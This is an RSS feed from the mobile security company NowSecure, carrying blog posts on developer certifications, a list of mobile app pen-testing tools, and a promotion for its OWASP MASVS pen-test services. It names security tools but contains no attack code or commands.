<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/">
  <channel>
    <title>NowSecure</title>
    <atom:link href="https://www.nowsecure.com/feed/" rel="self" type="application/rss+xml" />
    <link>https://www.nowsecure.com</link>
    <description>Deliver Secure Mobile Apps Faster</description>
    <lastBuildDate>Mon, 25 Apr 2022 16:22:14 +0000</lastBuildDate>
    <language>en-US</language>
    <sy:updatePeriod>
	hourly	</sy:updatePeriod>
    <sy:updateFrequency>
	1	</sy:updateFrequency>
    <generator>https://wordpress.org/?v=5.9.3</generator>
    <image>
      <url>https://www.nowsecure.com/wp-content/uploads/2018/12/cropped-Image-from-iOS-32x32.png</url>
      <title>NowSecure</title>
      <link>https://www.nowsecure.com</link>
      <width>32</width>
      <height>32</height>
    </image>
    <item>
      <title>Top Certifications for Developers: Mobile Edition</title>
      <link>https://www.nowsecure.com/blog/2022/04/27/top-certifications-for-developers-mobile-edition/</link>
      <dc:creator><![CDATA[Amy Schurr]]></dc:creator>
      <pubDate>Wed, 27 Apr 2022 12:30:00 +0000</pubDate>
      <category><![CDATA[Industry News]]></category>
      <category><![CDATA[Academy]]></category>
      <category><![CDATA[Certifications]]></category>
      <category><![CDATA[certifications for developers]]></category>
      <category><![CDATA[mobile developer certifications]]></category>
      <category><![CDATA[Mobile Edition]]></category>
      <category><![CDATA[NowSecure Academy]]></category>
      <category><![CDATA[top certifications for developers]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16710</guid>
      <description><![CDATA[<p>Both new and experienced software developers benefit from a variety of professional certifications. These certifications for developers foster higher quality code throughout the software development lifecycle. Beyond showing a developer’s expertise, they display a commitment to continuous education in a rapidly changing industry. Certifications not only help developers grow their career and earn higher salaries,</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/04/27/top-certifications-for-developers-mobile-edition/">Top Certifications for Developers: Mobile Edition</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Both new and experienced software developers benefit from a variety of professional certifications. These<strong> certifications for developers</strong> foster higher quality code throughout the software development lifecycle. Beyond showing a developer’s expertise, they display a commitment to continuous education in a rapidly changing industry. Certifications not only help developers grow their career and earn higher salaries, they help deliver safer software faster.<br><br>When it comes to mobile app development however, certification programs are relatively new and typically focused on specific platforms such as Android or iOS. Certifications can help mobile app developers distinguish themselves from their peers and stay ahead of the changing <a href="https://www.nowsecure.com/mobile-app-breach-news/">security and privacy landscape</a>.</p>



<figure class="wp-block-image size-full"><img width="769" height="481" src="https://www.nowsecure.com/wp-content/uploads/2022/04/Dev-Cert-blog-feat-image-v2-768x480-1.png" alt="" class="wp-image-16712" srcset="https://www.nowsecure.com/wp-content/uploads/2022/04/Dev-Cert-blog-feat-image-v2-768x480-1.png 769w, https://www.nowsecure.com/wp-content/uploads/2022/04/Dev-Cert-blog-feat-image-v2-768x480-1-360x225.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/04/Dev-Cert-blog-feat-image-v2-768x480-1-600x375.png 600w, https://www.nowsecure.com/wp-content/uploads/2022/04/Dev-Cert-blog-feat-image-v2-768x480-1-240x150.png 240w" sizes="(max-width: 769px) 100vw, 769px" /></figure>



<h2><strong>Start with OS Essential Certifications</strong></h2>



<p>The two most popular <strong>mobile developer certifications</strong> begin with the dueling operating systems from Apple and Google. Mobile developers tend to pick a platform and primarily focus on either Android or iOS mobile app development.</p>



<p>Android developers should pursue the <a href="https://developers.google.com/certification/associate-android-developer" target="_blank" rel="noreferrer noopener">Associate Android Developer</a> certification, the first in a series from Google. The certification measures basic, entry-level Android developer skills and features exams for both in Kotlin and Java.&nbsp;</p>



<p>Swift is Apple&#8217;s iOS development language. Apple doesn&#8217;t offer a Swift certification, however, which means a variety of third-party certifiers have emerged. Online courses at universities or training sites like Coursera or Udemy offer respected programs. To start, developers would be wise to seek <a href="https://www.coursera.org/specializations/app-development" target="_blank" rel="noreferrer noopener">iOS Application Development with Swift Certification</a>. The exam tests basic understanding of iOS development tools, basic programming concepts using Swift as the language, and industry best practices.</p>



<p>“Developers don’t necessarily need to be proficient in both Android and iOS development,” says George Anderson, vice president of engineering for NowSecure. “While an understanding of both platforms can be very helpful, many developers select one platform and stick with it for a variety of reasons. Regardless of the platform they choose, developers should start with OS certifications.”</p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	“Certifications do more than look good on a resume. They make developers better coders and more valuable assets to an organization.” — 

    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; George Anderson, Vice President of Engineering, NowSecure</cite>

	
</blockquote>



<p></p>



<h2><strong>Mobile Development Platform Certifications</strong></h2>



<p>Mobile developers can also achieve a certification for building apps in Flutter. Flutter is Google&#8217;s mobile UI framework for crafting high-quality native interfaces on iOS, Android, web, and desktop. It works with existing code, is used by developers and organizations around the world, and is free and open source. The <a href="https://androidatc.com/courses/Eng/Flutter%E2%84%A2-Application-Development" target="_blank" rel="noreferrer noopener">Flutter Certified Application Developer </a>designation shows proficiency in this framework specifically for mobile applications.<br>&nbsp;The <a href="https://www.ibm.com/certify/exam?id=C1000-003" target="_blank" rel="noreferrer noopener">IBM Mobile Foundation v8.0 Application Development </a>certification shows proficiency in using IBM’s platform for native, hybrid and cross-platform mobile app development. MobileFirst Foundation, formerly known as IBM Worklight®, is a suite of software development products that allow developers to build and deliver mobile applications for the enterprise.</p>



<p>“Some certifications, like the ones for Flutter or IBM Mobile Foundation show cross-platform expertise,” adds Anderson. “They may be valuable for developers entering specific organizations whose tech stack requires the use of unique platforms or tools.”</p>



<h2><strong>NowSecure Academy Mobile Security Certifications</strong></h2>



<p>Before 2021, there were very few current certification programs for secure mobile app development and mobile app security testing. In a <a href="https://www.sans.org/webcasts/2021-survey-rethinking-sec-devsecops-security-code-118235/" target="_blank" rel="noreferrer noopener">SANS Institute 2021 DevSecOps Survey</a>, respondents identified training developers and engineers on secure coding practices as the top success factor with highest impact on security and quality. This need for professional training and certification led to the creation of <a href="https://academy.nowsecure.com/">NowSecure Academy</a>.</p>



    <div id="featured-resource-block"
         class="cta-id-15582 resource-id-15554 post-type-page">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/08/academy.png)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        NowSecure Academy Mobile AppSec Training                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://www.nowsecure.com/products/nowsecure-academy-mobile-appsec-training/"
                       target="_self">

                        Get Started for Free with Mobile AppSec Training
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<p>“Until now there were few formal training programs for mobile app developers in the security testing arena, and none that had emerged as an industry standard,” says Anderson. “NowSecure saw an opportunity to offer the kind of robust mobile appsec training we offer to our top-tier customers and government agencies to plug the skills gap.”</p>



<p>Offering training in the fundamentals of mobile app security for development and security professionals, DevOps leads and other aspiring security champions, NowSecure Academy provides the resources for teams to learn, communicate or adopt secure coding practices. Delivered in a mix of paid and free training, these <a href="https://www.nowsecure.com/blog/2022/04/13/popular-mobile-app-security-testing-tools/">mobile appsec courses</a> focus on domain knowledge and actionable learning. NowSecure aims to make training relevant and valuable to the entire DevOps community and all stakeholders.&nbsp;</p>



<p>NowSecure Academy courses include free mobile appsec training to help educate the mobile dev, architects, QA, DevOps engineers and security analysts in the community, as well as formal professional certification programs for individuals and organizations. For example, on-demand, self-paced online training modules help developers expand their cybersecurity skills and earn a <a href="https://academy.nowsecure.com/plan/secure-mobile-development-certification">secure mobile development certificate </a>to act as a champion for their team.&nbsp;</p>



<h2><strong>Why Certifications Matter</strong></h2>



<p>Employers look for developer candidates with experience building high-quality, secure mobile apps. They want coders who deliver high quality code with a broad knowledge of various programming languages, API integrations and security best practices. We see a growing trend in application development and mobile security certifications and hear about higher pay opportunities, so having one can not only differentiate developers from other candidates, it can make them better coders, help them land better assignments and demand higher salaries.</p>



<p>“Certifications do more than look good on a resume. They make developers better coders and more valuable assets to an organization,” says Anderson. “Perhaps their greatest value lies in the importance they place on best practices for security and privacy. Many organizations will fund or reimburse devs for these certifications to gain an advantage for their products.”</p>



<p>NowSecure Academy is our free training and paid certification resource to upskill developers, architects, QA, devops and security teams. Visit <a href="http://academy.nowsecure.com/">academy.nowsecure.com</a> and sign up for an account today.</p>



<p></p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/04/27/top-certifications-for-developers-mobile-edition/">Top Certifications for Developers: Mobile Edition</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Popular Mobile App Security Testing Tools</title>
      <link>https://www.nowsecure.com/blog/2022/04/13/popular-mobile-app-security-testing-tools/</link>
      <dc:creator><![CDATA[Amy Schurr]]></dc:creator>
      <pubDate>Wed, 13 Apr 2022 13:25:46 +0000</pubDate>
      <category><![CDATA[Mobile Security Solutions]]></category>
      <category><![CDATA[mobile app security]]></category>
      <category><![CDATA[mobile app security testing]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16679</guid>
      <description><![CDATA[<p>Taking the perspective of an attacker and attempting to exploit mobile apps offers valuable insights into app security and privacy vulnerabilities. In fact, many organizations’ risk management programs require regular manual pen testing assessments of mobile apps to ensure they’re secure. Security analysts and pen testers rely on an arsenal of mobile app security testing</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/04/13/popular-mobile-app-security-testing-tools/">Popular Mobile App Security Testing Tools</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Taking the perspective of an attacker and attempting to exploit mobile apps offers valuable insights into app security and privacy vulnerabilities. In fact, many organizations’ risk management programs require regular<em> </em>manual pen testing assessments of mobile apps to ensure they’re secure.</p>



<p>Security analysts and pen testers rely on an arsenal of <a href="https://www.nowsecure.com/solutions/by-need/mobile-app-security-testing/">mobile app security testing tools</a> to deeply examine an app. Depending on the user’s level of experience and expertise, the mix typically includes open-source and commercial tools for iOS and Android application security testing.&nbsp;</p>



<p>At NowSecure, we provide the&nbsp; <a href="https://www.nowsecure.com/products/nowsecure-platform/">NowSecure Workstation pen testing toolkit, NowSecure Platform </a>&nbsp;for fully automated testing and open-source tools like <a href="https://frida.re/" target="_blank" rel="noreferrer noopener">Frida</a><a href="https://frida.re/"> </a>and <a href="https://www.radare.org/r/" target="_blank" rel="noreferrer noopener">Radare</a> developed by our research team. Read on to discover our recommendations for tools that ease the mobile app security testing process.</p>



<p></p>



<figure class="wp-block-image size-full"><img loading="lazy" width="769" height="481" src="https://www.nowsecure.com/wp-content/uploads/2022/04/mobile_appsec_test_tool_feat._image_768x480.png" alt="Mobile App Security Testing Tools" class="wp-image-16686" srcset="https://www.nowsecure.com/wp-content/uploads/2022/04/mobile_appsec_test_tool_feat._image_768x480.png 769w, https://www.nowsecure.com/wp-content/uploads/2022/04/mobile_appsec_test_tool_feat._image_768x480-360x225.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/04/mobile_appsec_test_tool_feat._image_768x480-600x375.png 600w, https://www.nowsecure.com/wp-content/uploads/2022/04/mobile_appsec_test_tool_feat._image_768x480-240x150.png 240w" sizes="(max-width: 769px) 100vw, 769px" /></figure>



<p></p>



<h2>Open Source Mobile App Security Testing Tools</h2>



<p>NowSecure researchers created two of the most popular open-source mobile app security testing tools, Frida<a href="https://frida.re/"> </a>and Radare. As part of its dedication to the open-source community, NowSecure continues to support these tools and more. Here are several open-source mobile app security testing tools our expert <a href="https://www.nowsecure.com/products/nowsecure-mobile-app-penetration-testing-services/">penetration testing services</a> team calls on when doing their work.</p>



<ul><li><a href="https://frida.re/" target="_blank" rel="noreferrer noopener"><strong>Frida</strong></a>: This dynamic instrumentation toolkit enables analysts to inject JavaScript snippets into native Windows, Mac, Linux, iOS and Android apps.&nbsp;</li></ul>



<ul><li><a href="https://ghidra-sre.org/"><strong>Ghidra</strong></a>: Developed by the U.S. National Security Agency, this open-source reverse engineering suite of tools includes a disassembler, decompile and a built-in scripting engine.</li><li><a href="https://mitmproxy.org/" target="_blank" rel="noreferrer noopener"><strong>Mitmproxy</strong></a><strong>:</strong> This HTTP proxy is used to identify man-in-the-middle vulnerabilities in mobile apps by intercepting and modifying requests and responses exchanged between an app and backend services.&nbsp;</li><li><a href="https://github.com/sensepost/objection" target="_blank" rel="noreferrer noopener"><strong>Objection</strong></a>: This runtime mobile security assessment framework is powered by Frida.&nbsp;</li><li><strong>OWASP Zed Attack Proxy (</strong><a href="https://owasp.org/www-project-zap/" target="_blank" rel="noreferrer noopener"><strong>ZAP</strong></a><strong>)</strong>: While primarily a tool for testing web apps and web services, ZAP has a proxy component that can be used to analyze mobile apps.</li><li><a href="http://radare.org/r/" target="_blank" rel="noreferrer noopener"><strong>Radare</strong></a><strong>:</strong> The reverse-engineering framework is used to analyze and inspect iOS and Android binaries.</li><li><a href="https://github.com/nowsecure/r2frida" target="_blank" rel="noreferrer noopener"><strong>R2frida</strong></a>: The r2project integration project blends the best of radare reverse engineering capabilities with the dynamic instrumentation toolkit of Frida to make each of the open-source tools <a href="https://www.nowsecure.com/blog/2017/01/24/building-best-open-source-mobile-app-security-testing-tool/">more powerful</a>.</li></ul>



<p></p>



    <div id="featured-resource-block"
         class="cta-id-16307 resource-id-15845 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/10/Pen-Testing-Ebook-feat-image-1200x628-1.png)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        How to Build A Successful Mobile App Penetration Testing Program                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://discover.nowsecure.com/c/mobile-app-pen-testing-whitepaper?x=cEXJzu"
                       target="_blank">

                        Learn More
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2>Android App Security Testing Tools</h2>



<p>Mobile pen testing pros can find several tools dedicated to the Android platform. Android app security testing tool offerings include:</p>



<ul><li><a href="https://developer.android.com/studio/command-line/adb" target="_blank" rel="noreferrer noopener"><strong>Android Debug Bridge (adb)</strong></a>: This versatile command-line tool is a Dex to Java decompiler useful for producing Java source code from Android DEX and APK files.</li></ul>



<ul><li><a href="https://github.com/iBotPeaches/Apktool" target="_blank" rel="noreferrer noopener"><strong>APKTool</strong></a>: This reverse engineering tool unpacks Android app packages to ensure the files are readable and can rebuild apps.</li><li><a href="https://labs.mwrinfosecurity.com/tools/drozer" target="_blank" rel="noreferrer noopener"><strong>Drozer</strong></a><strong>:</strong> This tool identifies security vulnerabilities in Android apps and devices using Android Interprocess Communications and supports the use and sharing of public exploits.</li><li><a href="https://github.com/skylot/jadx" target="_blank" rel="noreferrer noopener"><strong>JADX</strong></a>: This tool eases the process of decompiling binaries for reverse engineering.&nbsp;</li><li><a href="https://topjohnwu.github.io/Magisk/" target="_blank" rel="noreferrer noopener"><strong>Magisk</strong></a><strong>: </strong>This tool for rooting Android devices has evolved over the years into a more powerful tool that boasts a collection of dozens of modules.&nbsp;</li><li><a href="https://github.com/ElderDrivers/EdXposed" target="_blank" rel="noreferrer noopener"><strong>Xposed</strong></a>: This tool grants access to many third-party or open-source tweaks that can be used for certain aspects of testing.</li></ul>



<p></p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	“Certifications do more than look good on a resume. They make developers better coders and more valuable assets to an organization.” — 

    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; George Anderson, Vice President of Engineering, NowSecure</cite>

	
</blockquote>



<p></p>



<h2>iOS Security Testing Tools</h2>



<p>Security analysts around the globe also have a selection of iOS security testing tools available to them. Here are some popular offerings to aid pen testing of iOS mobile apps:</p>



<ul><li><a href="https://checkra.in/" target="_blank" rel="noreferrer noopener"><strong>Checkra1n</strong></a>: This jailbreaking tool for iOS helps analysts gain root access to a device.</li><li><a href="https://github.com/ChiChou/grapefruit" target="_blank" rel="noreferrer noopener"><strong>Grapefruit</strong></a>: The successor to Passionfruit, this is a runtime application instrumentation tool for iOS.</li><li><a href="https://github.com/mechanico/Keychain-Dumper" target="_blank" rel="noreferrer noopener"><strong>Keychain-Dumper</strong></a>: This iOS tool helps analysts determine what keychain items are available to an attacker after an iOS device has been jailbroken.</li><li><a href="https://developer.apple.com/xcode/ide/" target="_blank" rel="noreferrer noopener"><strong>Xcode</strong></a>: The integrated development environment for macOS suite of tools can be used to interact with an iOS device during pen testing and analyze logs.</li></ul>



<p></p>



<h2>Commercial Mobile App Security Testing Tools</h2>



<p>In addition to free OSS tools, mobile pen testers find a few paid mobile app security testing tools indispensable to their work.&nbsp;</p>



<ul><li><a href="https://portswigger.net/burp" target="_blank" rel="noreferrer noopener"><strong>Burp Suite</strong></a>: Published by Portswigger, this web proxy testing tool can also be used to test mobile apps and APIs and analyze network traffic.</li><li><a href="https://www.hopperapp.com/" target="_blank" rel="noreferrer noopener"><strong>Hopper</strong></a>: This reverse engineering tool comes in handy for disassembling, decompiling and debugging applications.</li><li><a href="https://hex-rays.com/ida-pro/" target="_blank" rel="noreferrer noopener"><strong>IDA Pro</strong></a>: Offered by Hex-Rays, this disassembler translates machine executable code into assembly language source code for debugging and reverse engineering.</li><li><a href="https://www.nowsecure.com/products/nowsecure-workstation/"><strong>NowSecure Workstation</strong></a><strong>: </strong>This wizard-driven interactive testing tool for security analysts speeds productivity when testing complex, high-risk and IoT-connected mobile apps.&nbsp;</li><li><a href="https://www.nowsecure.com/products/nowsecure-platform/"><strong>NowSecure Platform</strong></a>: This mobile app security testing tool can automate about 80% of manual security testing, freeing staff to focus on the challenging aspects of mobile pen tests.<br></li></ul>



<p></p>



<p>Less experienced testers may face a steep learning curve with open-source testing tools. In order to scale testing and keep pace with the mobile app development team’s release velocity, NowSecure highly recommends deploying a commercial automated mobile app security testing tool. A wizard-driven automation testing tool like NowSecure Workstation brings consistency, reduces onboarding time for new analysts, eases testing setup and helps organizations contend with skills gaps, workforce shortages and testing backlogs.&nbsp;</p>



<p>The <a href="https://www.nowsecure.com/products/nowsecure-workstation/">NowSecure Workstation </a>wizard-driven toolkit boosts productivity and collapses testing into a single day. <a href="https://www.nowsecure.com/products/nowsecure-platform/">NowSecure Platform</a> fully automates the process to achieve continuous mobile appsec testing. To learn more about what features and functionality to look for in an automated mobile app security testing tool, consult our <a href="https://discover.nowsecure.com/c/mobile-appsec-checklist?x=9z-j5n">Mobile AppSec Testing Checklist</a> to help guide your evaluation.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/04/13/popular-mobile-app-security-testing-tools/">Popular Mobile App Security Testing Tools</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>NowSecure Debuts New OWASP MASVS Mobile Pen Tests</title>
      <link>https://www.nowsecure.com/blog/2022/03/22/nowsecure-debuts-new-owasp-masvs-mobile-pen-tests/</link>
      <dc:creator><![CDATA[Brian Reed]]></dc:creator>
      <pubDate>Tue, 22 Mar 2022 20:00:00 +0000</pubDate>
      <category><![CDATA[Best Practices]]></category>
      <category><![CDATA[Company News]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16613</guid>
      <description><![CDATA[<p>Highly regulated and strongly-branded organizations and businesses that embrace industry standards should ensure that their mobile apps comply with the OWASP Mobile Application Security Verification Standard (MASVS) security requirements. To support these needs, NowSecure recently expanded its expert mobile application penetration tests to offer OWASP MASVS compliance and incorporated OWASP MASVS findings into NowSecure Platform</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/03/22/nowsecure-debuts-new-owasp-masvs-mobile-pen-tests/">NowSecure Debuts New OWASP MASVS Mobile Pen Tests</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Highly regulated and strongly-branded organizations and businesses that embrace <a href="https://www.nowsecure.com/solutions/by-need/mobile-standards-compliance/">industry standards </a>should ensure that their mobile apps comply with the <strong>OWASP Mobile Application Security Verification Standard (MASVS)</strong> security requirements. To support these needs, NowSecure recently expanded its expert <a href="https://www.nowsecure.com/products/nowsecure-mobile-app-penetration-testing-services/">mobile application penetration tests</a> to offer OWASP MASVS compliance and incorporated OWASP MASVS findings into NowSecure Platform software for <a href="https://www.nowsecure.com/products/nowsecure-platform/">automated mobile application security testing</a>.</p>



<p>Launched in 2013 and most recently updated in 2022, the OWASP mobile project has driven standards-based security requirements and testing strategies for close to a decade. Used by mobile app developers, security teams and security researchers, the <a href="https://owasp.org/www-project-mobile-security-testing-guide/" target="_blank" rel="noreferrer noopener">OWASP mobile project </a>comprises a <a href="https://www.nowsecure.com/resource/essential-guide-to-applying-the-owasp-mobile-security-project/">trifecta of resources </a>to reduce risk in mobile apps:&nbsp;</p>



<ul><li>OWASP Mobile Application Security Verification Standard (<a href="https://github.com/OWASP/owasp-masvs" target="_blank" rel="noreferrer noopener">MASVS</a>) establishes a baseline of security requirements for mobile apps</li><li>OWASP Mobile Security Testing Guide (<a href="https://github.com/OWASP/owasp-mstg" target="_blank" rel="noreferrer noopener">MSTG</a>) outlines how to test the MASVS requirements</li><li>OWASP Mobile App Security Checklist<a href="https://www.nowsecure.com/blog/2022/02/23/owasp-mobile-security-testing-checklist-aids-compliance/"> tracks security assessment </a>tasks</li></ul>



<p></p>



<h2>The Importance of OWASP</h2>



<p>&#8220;The OWASP MASVS and MSTG are the foundation of a mobile appsec program,” says Carlos Holguera, OWASP project lead and NowSecure security researcher. “The MASVS guides developers and security analysts on architecture, threat modeling and proper techniques to secure mobile data. The MSTG has hundreds of tests you should perform and there are many nuances and edge cases to consider.”<br></p>



<p>“Without the right expertise it can be tough to effectively achieve full MASVS compliance,” Holguera notes. “Having security professionals you can trust is essential.” Tapping unparalleled mobile-focused expertise, NowSecure Services delivers the world’s most comprehensive mobile penetration testing to uncover and help remediate security, privacy and compliance risks in mobile apps. In collaboration with customers, NowSecure <a href="https://www.nowsecure.com/blog/2022/01/26/an-app-development-leaders-guide-to-mobile-penetration-testing/">customizes its mobile application pen tests</a> to a particular app’s risk profile and security requirements, collaborating with clients to ensure success.</p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	“Certifications do more than look good on a resume. They make developers better coders and more valuable assets to an organization.” — 

    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; George Anderson, Vice President of Engineering, NowSecure</cite>

	
</blockquote>



<p></p>



<h2>Deep, Dedicated Experience</h2>



<p>Over the past decade, the NowSecure Services team has performed more than 10,000 mobile app pen tests across a wide variety of mobile apps and industries. In particular, many customers seek the validation of a third party to verify the security of highly regulated or sensitive apps that contain Personally Identifiable Information (PII) or unique intellectual property (IP), mobile connected IoT or are a brand new release or major update. Smaller companies and those that lack the in-house staff or skills to conduct expert manual security assessments also regularly rely on NowSecure for expert mobile app pen tests.&nbsp;</p>



<p>Priding itself on excellent customer service, NowSecure offers a full complement of mobile penetration testing services including rapid, targeted, full-scope and certifications such as <a href="https://www.nowsecure.com/blog/2021/04/14/nowsecure-adds-ioxt-security-compliance-testing-for-iot-vpn-mobile-apps/">ioXt certification</a> for IoT-connected mobile apps and <a href="https://www.nowsecure.com/blog/2020/04/27/niap-mobile-app-vetting-nowsecure-announces-worlds-first-automated-testing-solution/">National Information Assurance Partnership (NIAP) compliance </a>for the mobile app protection profile. Today NowSecure adds <strong>OWASP MASVS mobile pen test</strong> services to the list of available expert-led certifications.&nbsp;</p>



<p>NowSecure pen testing services have long empowered mobile-first organizations, mobile app developers and mobile app security teams to release secure mobile apps. The pen tests follow a rigorous methodology that includes assessment kickoff, customer policy review, industry compliance review, threat modeling, comprehensive app analysis, customized reporting, results walkthrough, remediation collaboration and retest to confirm validated remediation.</p>



<p>“We are proud to add OWASP MASVS compliance to our mobile app penetration testing services lineup,” says Michael Krueger, senior director of application security for NowSecure.</p>



<p>“Our world-class team boasts unmatched expertise and looks forward to partnering with customers to demonstrate their mobile apps comply with the gold standard for mobile appsec.”</p>



<p></p>



    <div id="featured-resource-block"
         class="cta-id-15223 resource-id-13865 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2019/12/Website-design.jpg)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        Checklist for Choosing a Mobile App Pen Testing Provider                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://discover.nowsecure.com/c/key-criteria-choosing-mobile-app-pen-testing-vendor?x=cEXJzu"
                       target="_blank">

                        Download Now
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2>MASVS &amp; MSTG&nbsp;</h2>



<p>NowSecure has contributed to the OWASP mobile project since its inception with NowSecure practitioners collaborating on spec evolution and tooling while the company serves as an OWASP <a href="https://github.com/OWASP/owasp-masvs/blob/master/Document/0x02-Frontispiece.md#donators" target="_blank" rel="noreferrer noopener">“god mode” sponsor for the OWASP MASVS</a>. NowSecure practitioners collaborate with OWASP to evolve based on the changing mobile security landscape and enable continuous integration with the standard not only at the requirements level but also at the MSTG test level. For example, NowSecure is currently involved in the MASVS refactoring community effort to develop the next major version of&nbsp;the standard. NowSecure is committed to continuously upgrade its products and services including the latest advancements coming straight from the MASVS and the MSTG.</p>



<p>The MSTG encourages the use of automated tools such as NowSecure Platform to perform <a href="https://www.nowsecure.com/blog/2019/09/25/5-misconceptions-about-dynamic-application-security-testing-dast-for-mobile/">static and dynamic analysis</a> of mobile app binaries. In addition to launching OWASP MASVS mobile penetration testing, NowSecure recently enhanced NowSecure Platform with all relevant MASVS findings to enable mobile app security and development teams to automate testing for standards compliance. NowSecure Platform provides cloud-based automated mobile app security testing for on-demand and DevSecOps continuous testing scenarios and delivers a battery of more than 600 automated mobile app tests.&nbsp;<br></p>



<p>Together, NowSecure Services and NowSecure Platform empower organizations to confidently build and deploy secure mobile apps faster. Download our <a href="https://www.nowsecure.com/resource/checklist-for-choosing-a-mobile-app-pen-testing-provider/">mobile penetration testing provider evaluation checklist</a> to discover more about what to look for in an OWASP MASVS mobile pen test, request your own <a href="https://info.nowsecure.com/mobile-app-pen-testing-services.html">mobile pen testing consultation</a>, or get a <a href="https://info.nowsecure.com/on-demand-continuous-mobile-appsec-testing.html?utm_source=website&amp;utm_medium=organic&amp;utm_campaign=evg-Zv3Dp&amp;utm_term=cta-tpl-Get%20a%20Demo">NowSecure Platform demo </a>to see how the findings map to the OWASP MASVS.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/03/22/nowsecure-debuts-new-owasp-masvs-mobile-pen-tests/">NowSecure Debuts New OWASP MASVS Mobile Pen Tests</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>2022 mhealth App Security and Privacy Trends</title>
      <link>https://www.nowsecure.com/blog/2022/03/09/2022-mhealth-app-security-and-privacy-trends/</link>
      <dc:creator><![CDATA[Brian Reed]]></dc:creator>
      <pubDate>Wed, 09 Mar 2022 13:00:00 +0000</pubDate>
      <category><![CDATA[Best Practices]]></category>
      <category><![CDATA[Industry News]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16409</guid>
      <description><![CDATA[<p>Healthcare mobile application developers now face heightened scrutiny over security and privacy vulnerabilities. The American Medical Association (AMA) recently encouraged companies that make mHealth apps and connected devices that collect health information to adopt privacy by design principles. And in 2022, all mHealth app makers must comply with the Federal Trade Commission’s Health Breach Notification</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/03/09/2022-mhealth-app-security-and-privacy-trends/">2022 mhealth App Security and Privacy Trends</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
